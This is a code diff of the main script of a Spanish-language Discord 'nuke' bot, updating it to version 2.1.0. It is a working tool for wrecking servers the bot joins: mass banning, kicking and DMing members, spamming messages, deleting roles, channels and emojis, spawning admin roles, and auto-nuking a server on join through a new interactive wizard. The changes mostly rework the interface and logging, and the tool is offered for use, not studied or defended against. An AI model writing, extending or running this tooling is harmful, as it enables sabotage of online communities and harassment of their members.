@@ -12,8 +12,9 @@ from src import menu, ui, wizard
 from src.config import load_config, save_config
 from src.modules import channels, extras, members, nuke, roles
 from src.modules.utils import human
+from src.terminal import term
 
-VERSION = "2.0.0"
+VERSION = "2.1.0"
 MAX_CHANNELS = 50
 
 try:
@@ -30,7 +31,12 @@ STATE = {
     "guild_id": CONFIG.get("default_guild") or None,
     "busy": False,
     "auto_nuke": bool(CONFIG.get("auto_nuke")),
+    "takeover": False,
+    "takeover_queue": [],
+    "last": None,
 }
+
+PROMPT = "  " + ui.C.BRAND + "\u276f " + ui.C.RESET
 
 
 # ───────────────────────── helpers ─────────────────────────
@@ -43,7 +49,6 @@ def require_client() -> bool:
 
 
 async def pick_guild():
-    """Muestra la lista de servidores y guarda el elegido."""
     if not require_client():
         return None
     guild = await menu.choose_guild(STATE["client"], STATE["guild_id"])
@@ -54,16 +59,29 @@ async def pick_guild():
     return guild
 
 
+def summarize(label: str, data: dict) -> None:
+    STATE["last"] = (label, data)
+
+
 class busy:
+    """Bloquea operaciones simultaneas, guarda el log y no ensucia la pantalla."""
+
     def __init__(self, label: str):
         self.label = label
+        self.lines: list = []
         self.spinner = None
+
+    def log(self, message) -> None:
+        self.lines.append(str(message))
 
     async def __aenter__(self):
         if STATE["busy"]:
             ui.warn("Ya hay una operacion en curso.")
             return False
         STATE["busy"] = True
+        ui.header(VERSION)
+        ui.title(self.label)
+        print()
         self.spinner = ui.Spinner(self.label).start()
         return True
 
@@ -71,17 +89,12 @@ class busy:
         STATE["busy"] = False
         if self.spinner:
             self.spinner.stop()
+        for message in self.lines[-8:]:
+            ui.step(message)
         if exc:
             ui.error(f"Fallo: {exc}")
             return True
         return False
-
-
-def report(title: str, data: dict) -> None:
-    ui.title(title)
-    for key, value in data.items():
-        ui.kv(key.replace("_", " "), value)
-    print()
 
 
 # ───────────────────────── cliente ─────────────────────────
@@ -97,19 +110,14 @@ def create_client() -> discord.Client:
 
     @client.event
     async def on_ready():
-        ui.ok(f"Conectado como {client.user}")
+        pass
 
     @client.event
     async def on_guild_join(guild: discord.Guild):
         if not STATE["auto_nuke"]:
             return
-        ui.info(f"Auto-nuke activado -> entrando a {guild.name}")
-        try:
-            data = await nuke.full_nuke(guild, client, log=ui.step)
-            ui.ok(f"Auto-nuke terminado en {guild.name}")
-            report("Auto-nuke", data)
-        except Exception as exc:
-            ui.error(f"Auto-nuke fallo: {exc}")
+        STATE["takeover_queue"].append(guild)
+        STATE["takeover"] = True
 
     return client
 
@@ -151,6 +159,33 @@ async def login(token: str) -> None:
     ui.kv("Servidores", human(len(client.guilds)))
 
 
+async def run_auto_nuke() -> None:
+    """Asistente completo cuando el bot entra a un servidor."""
+    if not STATE["takeover_queue"]:
+        STATE["takeover"] = False
+        return
+
+    guild = STATE["takeover_queue"].pop(0)
+    STATE["takeover"] = bool(STATE["takeover_queue"])
+
+    ui.header(VERSION)
+    ui.title("Auto-nuke")
+    ui.kv("Servidor", guild.name)
+    ui.plain("Servidor nuevo detectado. Configura el nuke:")
+    print()
+
+    options = await wizard.nuke_wizard(STATE["client"], guild)
+    if not options:
+        ui.info("Auto-nuke omitido.")
+        return
+
+    async with busy(f"Nukeando {guild.name}...") as go:
+        if not go:
+            return
+        data = await nuke.full_nuke(guild, STATE["client"], log=go.log, **options)
+    summarize(f"auto-nuke {guild.name}", data)
+
+
 # ───────────────────────── acciones ─────────────────────────
 
 ACTIONS: dict = {}
@@ -176,8 +211,8 @@ async def act_nuke():
     async with busy("Nukeando el servidor...") as go:
         if not go:
             return
-        data = await nuke.full_nuke(guild, STATE["client"], log=ui.step, **options)
-    report("Reporte del nuke", data)
+        data = await nuke.full_nuke(guild, STATE["client"], log=go.log, **options)
+    summarize("nuke total", data)
 
 
 @action("banall", aliases=("2", "ban"))
@@ -190,8 +225,8 @@ async def act_banall():
         if not go:
             return
         n = await members.ban_all(guild, STATE["client"], reason=reason,
-                                  concurrency=CONFIG["nuke"]["concurrency"], log=ui.step)
-    ui.ok(f"{human(n)} miembros baneados.")
+                                  concurrency=CONFIG["nuke"]["concurrency"], log=go.log)
+    summarize("banall", {"miembros_baneados": human(n)})
 
 
 @action("kickall", aliases=("3", "kick"))
@@ -202,8 +237,8 @@ async def act_kickall():
     async with busy("Expulsando miembros...") as go:
         if not go:
             return
-        n = await members.kick_all(guild, STATE["client"], log=ui.step)
-    ui.ok(f"{human(n)} miembros expulsados.")
+        n = await members.kick_all(guild, STATE["client"], log=go.log)
+    summarize("kickall", {"miembros_expulsados": human(n)})
 
 
 @action("nickall", aliases=("4",))
@@ -215,8 +250,8 @@ async def act_nickall():
     async with busy("Renombrando miembros...") as go:
         if not go:
             return
-        n = await members.nick_all(guild, nick, log=ui.step)
-    ui.ok(f'{human(n)} nicks cambiados a "{nick}".')
+        n = await members.nick_all(guild, nick, log=go.log)
+    summarize("nickall", {"nicks_cambiados": human(n), "nick": nick})
 
 
 @action("dmall", aliases=("5",))
@@ -228,8 +263,8 @@ async def act_dmall():
     async with busy("Enviando DMs...") as go:
         if not go:
             return
-        n = await members.dm_all(guild, message, log=ui.step)
-    ui.ok(f"{human(n)} DMs enviados.")
+        n = await members.dm_all(guild, message, log=go.log)
+    summarize("dmall", {"dms_enviados": human(n)})
 
 
 @action("spam", aliases=("6",))
@@ -243,8 +278,9 @@ async def act_spam():
     async with busy("Enviando spam...") as go:
         if not go:
             return
-        n = await extras.spam_channel(options["channel"], options["message"], options["times"], log=ui.step)
-    ui.ok(f"{human(n)} mensajes enviados en #{options['channel'].name}.")
+        n = await extras.spam_channel(options["channel"], options["message"],
+                                      options["times"], log=go.log)
+    summarize("spam", {"mensajes": human(n), "canal": "#" + options["channel"].name})
 
 
 @action("roledestroy", aliases=("7", "roledel"))
@@ -255,8 +291,8 @@ async def act_roledestroy():
     async with busy("Borrando roles...") as go:
         if not go:
             return
-        n = await roles.destroy_roles(guild, log=ui.step)
-    ui.ok(f"{human(n)} roles borrados.")
+        n = await roles.destroy_roles(guild, log=go.log)
+    summarize("roledestroy", {"roles_borrados": human(n)})
 
 
 @action("rolespam", aliases=("8",))
@@ -269,8 +305,8 @@ async def act_rolespam():
     async with busy("Creando roles...") as go:
         if not go:
             return
-        n = await roles.spam_roles(guild, count, name=name, log=ui.step)
-    ui.ok(f"{human(n)} roles creados.")
+        n = await roles.spam_roles(guild, count, name=name, log=go.log)
+    summarize("rolespam", {"roles_creados": human(n)})
 
 
 @action("chandestroy", aliases=("9", "chandel"))
@@ -281,8 +317,8 @@ async def act_chandestroy():
     async with busy("Borrando canales...") as go:
         if not go:
             return
-        n = await channels.destroy_channels(guild, log=ui.step)
-    ui.ok(f"{human(n)} canales borrados.")
+        n = await channels.destroy_channels(guild, log=go.log)
+    summarize("chandestroy", {"canales_borrados": human(n)})
 
 
 @action("chanspam", aliases=("10",))
@@ -297,8 +333,8 @@ async def act_chanspam():
     async with busy("Creando canales...") as go:
         if not go:
             return
-        created = await channels.spam_channels(guild, count, kind=kind, name=name, log=ui.step)
-    ui.ok(f"{human(len(created))} canales de {kind} creados.")
+        created = await channels.spam_channels(guild, count, kind=kind, name=name, log=go.log)
+    summarize("chanspam", {"canales_creados": human(len(created)), "tipo": kind})
 
 
 @action("emojidestroy", aliases=("11",))
@@ -309,9 +345,9 @@ async def act_emojis():
     async with busy("Borrando emojis y stickers...") as go:
         if not go:
             return
-        e = await extras.delete_emojis(guild, log=ui.step)
-        s = await extras.delete_stickers(guild, log=ui.step)
-    ui.ok(f"{human(e)} emojis y {human(s)} stickers borrados.")
+        e = await extras.delete_emojis(guild, log=go.log)
+        s = await extras.delete_stickers(guild, log=go.log)
+    summarize("emojidestroy", {"emojis": human(e), "stickers": human(s)})
 
 
 @action("vcdisconnect", aliases=("12", "vckick"))
@@ -322,8 +358,8 @@ async def act_vc():
     async with busy("Desconectando de voz...") as go:
         if not go:
             return
-        n = await extras.disconnect_voice(guild, log=ui.step)
-    ui.ok(f"{human(n)} usuarios desconectados.")
+        n = await extras.disconnect_voice(guild, log=go.log)
+    summarize("vcdisconnect", {"usuarios": human(n)})
 
 
 @action("rename", aliases=("13", "guildname"))
@@ -334,7 +370,7 @@ async def act_rename():
     name = await menu.ask("Nuevo nombre del servidor", default=guild.name)
     try:
         await guild.edit(name=name[:100], reason="nuke")
-        ui.ok(f'Servidor renombrado a "{name}"')
+        summarize("rename", {"servidor": name})
     except Exception as exc:
         ui.error(str(exc))
 
@@ -352,7 +388,7 @@ async def act_icon():
         if not go:
             return
         await extras.set_icon(guild, source)
-    ui.ok("Foto del servidor actualizada.")
+    summarize("foto", {"servidor": guild.name, "estado": "actualizada"})
 
 
 @action("status", aliases=("15",))
@@ -362,7 +398,7 @@ async def act_status():
     kind = await menu.ask("Tipo (playing/watching/listening/competing)", default="playing")
     text = await menu.ask("Texto del estado", default="nuking servers")
     await extras.set_status(STATE["client"], text, kind)
-    ui.ok(f"Estado: {kind} {text}")
+    summarize("status", {"estado": f"{kind} {text}"})
 
 
 @action("info", aliases=("16",))
@@ -374,17 +410,15 @@ async def act_info():
         if not go:
             return
         members_list = await members.fetch_all_members(guild)
-        owner = guild.owner
         ui.title("Servidor")
         ui.kv("Nombre", guild.name)
         ui.kv("ID", guild.id)
-        ui.kv("Owner", owner.user if owner else "desconocido")
+        ui.kv("Owner", guild.owner.user if guild.owner else "desconocido")
         ui.kv("Miembros", human(len(members_list)))
         ui.kv("Canales", human(len(guild.channels)))
         ui.kv("Roles", human(len(guild.roles)))
         ui.kv("Emojis", human(len(guild.emojis)))
         ui.kv("Boost", f"nivel {guild.premium_tier}")
-        print()
 
 
 @action("auto", aliases=("17", "autonuke"))
@@ -395,6 +429,8 @@ async def act_auto():
     CONFIG["auto_nuke"] = value
     save_config(CONFIG)
     ui.ok(f"Auto-nuke {'activado' if value else 'desactivado'}.")
+    if value:
+        ui.plain("Al entrar a un servidor pedira toda la configuracion del nuke.")
 
 
 @action("config", aliases=("18", "ajustes"))
@@ -442,13 +478,15 @@ async def act_guilds():
 
 @action("help", aliases=("22", "?"))
 async def act_help():
-    print_menu(full=True)
+    render_menu(full=True)
+    await menu.pause()
 
 
 @action("exit", aliases=("0", "quit", "q"))
 async def act_exit():
     if STATE["client"]:
         await STATE["client"].close()
+    ui.clear()
     ui.ok("Hasta luego.")
     sys.exit(0)
 
@@ -456,34 +494,34 @@ async def act_exit():
 # ───────────────────────── menu ─────────────────────────
 
 MENU = [
-    ("1", "Nuke total", "destruye y reconstruye el servidor"),
-    ("2", "Banear a todos", "banea todos los miembros"),
+    ("1", "Nuke total", "destruye y reconstruye"),
+    ("2", "Banear a todos", "ban masivo"),
     ("3", "Expulsar a todos", "kick masivo"),
-    ("4", "Cambiar nick", "nick para todos los miembros"),
+    ("4", "Cambiar nick", "nick para todos"),
     ("5", "DM masivo", "mensaje privado a todos"),
     ("6", "Spam de mensajes", "repite un mensaje N veces"),
     ("7", "Borrar roles", "elimina todos los roles"),
-    ("8", "Crear roles", "spawnea N roles con admin"),
+    ("8", "Crear roles", "N roles con admin"),
     ("9", "Borrar canales", "elimina todos los canales"),
-    ("10", "Crear canales", "spawnea N canales (max 50)"),
+    ("10", "Crear canales", "max 50"),
     ("11", "Borrar emojis/stickers", "limpia emojis y stickers"),
     ("12", "Desconectar de voz", "saca a todos de los VC"),
     ("13", "Renombrar servidor", "cambia el nombre"),
     ("14", "Cambiar foto", "ruta local o URL"),
     ("15", "Estado del bot", "presencia del bot"),
-    ("16", "Info del servidor", "datos del servidor activo"),
+    ("16", "Info del servidor", "datos del servidor"),
     ("17", "Auto-nuke", "nuke al entrar a un servidor"),
     ("18", "Ajustes", "parametros del nuke"),
     ("19", "Login", "conecta el bot"),
     ("20", "Logout", "desconecta el bot"),
     ("21", "Cambiar servidor", "elige otro servidor"),
-    ("22", "Ayuda", "explicacion de cada opcion"),
+    ("22", "Ayuda", "explicacion de opciones"),
     ("0", "Salir", "cierra el programa"),
 ]
 
 
-def print_menu(full: bool = False) -> None:
-    ui.print_banner(VERSION)
+def render_menu(full: bool = False) -> None:
+    ui.header(VERSION)
 
     if STATE["client"]:
         guild = STATE["client"].get_guild(int(STATE["guild_id"])) if STATE["guild_id"] else None
@@ -492,40 +530,42 @@ def print_menu(full: bool = False) -> None:
         ui.kv("Auto-nuke", "activado" if STATE["auto_nuke"] else "desactivado")
     else:
         ui.kv("Estado", "sin conexion")
-    print()
 
+    if STATE["last"]:
+        label, data = STATE["last"]
+        print()
+        print("  " + ui.C.BRAND + "\u25b8 ULTIMA ACCION" + ui.C.RESET
+              + ui.C.MUTED + f"  {label}" + ui.C.RESET)
+        for key, value in list(data.items())[:5]:
+            ui.line(key, value)
+
+    print()
     ui.title("Menu principal")
     for number, label, desc in MENU:
-        print("  " + ui.C.BRAND + number.rjust(2) + ui.RESET + "  "
-              + ui.C.TEXT + label.ljust(24) + ui.RESET
-              + ui.C.MUTED + (desc if full or True else "") + ui.RESET)
+        print("  " + ui.C.BRAND + number.rjust(2) + ui.C.RESET + "  "
+              + ui.C.TEXT + label.ljust(24) + ui.C.RESET
+              + ui.C.MUTED + desc + ui.C.RESET)
     print()
-    print("  " + ui.C.MUTED + "Elige un numero, o escribe el comando directo (nuke, banall, spam...)"
-          + ui.RESET)
-    print()
+    print("  " + ui.C.MUTED + "Numero, o comando directo (nuke, banall, spam...)" + ui.C.RESET)
 
 
 async def menu_loop() -> None:
     while True:
-        print_menu()
-        raw = (await menu.read_line("Opcion")).strip().lower()
+        render_menu()
+        answer = await term.read_until(PROMPT, lambda: STATE["takeover"])
+
+        if answer is None:            # el bot entro a un servidor -> asistente
+            await run_auto_nuke()
+            continue
+
+        raw = answer.strip().lower()
         if not raw:
             continue
 
-        handler = None
-        if raw in ACTIONS:
-            handler = ACTIONS[raw]
-        else:
-            for number, _label, _desc in MENU:
-                if raw == number:
-                    break
-
-        if raw in ACTIONS:
-            handler = ACTIONS[raw]
-        else:
-            ui.error(f'Opcion invalida: "{raw}". Escribe help.')
-
+        handler = ACTIONS.get(raw)
         if not handler:
+            ui.error(f'Opcion invalida: "{raw}"')
+            await menu.pause()
             continue
 
         try:
@@ -539,13 +579,16 @@ async def menu_loop() -> None:
 
 
 async def run() -> None:
+    term.start()
     ui.print_banner(VERSION)
 
     if CONFIG.get("token"):
         ui.info("Token detectado en config.json, conectando...")
         await login(CONFIG["token"])
+        await menu.pause("Enter para abrir el menu")
     else:
         ui.warn("Sin token. Elige la opcion 19 para conectar el bot.")
+        await menu.pause("Enter para abrir el menu")
 
     try:
         await menu_loop()
